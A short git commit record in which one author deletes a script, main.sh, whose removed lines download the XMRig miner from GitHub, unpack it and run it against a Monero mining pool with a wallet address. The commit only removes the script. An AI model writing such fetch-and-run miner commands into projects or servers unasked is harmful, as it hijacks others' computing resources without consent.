e5628231d8e888504c757cfb62bca66a7524a107
Estiko Aji Saputro <estiko@mediaqu.com>
2021-08-09 12:11:41 +0700

    Delete main.sh

--- main.sh
+++
@@ -1,4 +0,0 @@
-# monero
-wget https://github.com/xmrig/xmrig/releases/download/v6.8.1/xmrig-6.8.1-bionic-x64.tar.gz
-tar -xvf xmrig-6.8.1-bionic-x64.tar.gz
-./xmrig-6.8.1/xmrig -o pool.supportxmr.com:443 -u 891KXaQfvtm11gV683bCpTYBZBjwiyw8e715RrW9rfbsif886KvPxDn4PBTTtFkUtg6KdvY4pbNgR5eenxyRrMmJ2xseTFn.contabo -k --tls -p x -t 4
